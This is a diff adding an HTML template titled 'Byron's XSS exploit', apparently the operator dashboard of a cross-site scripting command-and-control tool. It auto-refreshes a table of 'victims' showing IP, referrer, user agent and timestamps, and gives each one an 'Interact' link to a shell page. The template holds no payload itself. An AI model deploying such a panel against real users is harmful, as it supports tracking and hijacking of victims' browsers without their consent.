@@ -1,0 +1,56 @@
+{% extends "base.html" %}
+{% block content %}
+<script>
+    setTimeout(function(){
+        window.location.reload();
+    }, 5000);
+</script>
+
+<div class="main">
+    <h1>Byron's XSS exploit</h1>
+    <br>
+
+    {% if victims %}
+    <table border="1">
+        <thead>
+
+            <tr>
+                <td>Id</td>
+                <td>Ip</td>
+                <td>Referrer</td>
+                <td>User Agent</td>
+                <td>First Seen</td>
+                <td>Last Seen</td>
+                <td>Shell</td>
+            </tr>
+        </thead>
+        <tbody>
+                {%  for victim in victims %}
+                <tr>
+                    <td>{{ victim.id }}</td>
+                    <td>{{ victim.ip }}</td>
+                    <td>{{ victim.referrer }}</td>
+                    <td>{{ victim.userAgent }}</td>
+                    <td>{{ victim.firstSeen }}</td>
+                    <td>{{ victim.lastSeen }}</td>
+                    <td><a href="/shell/{{ victim.id }}">Interact</a><br></td>
+                </tr>
+            {%  endfor %}
+        </tbody>
+    </table>
+
+    {% else %}
+        <div>No victims yet</div>
+    {% endif %}
+
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+
+    <a href="/victim">victim</a>
+
+</div>
+
+{% endblock %}
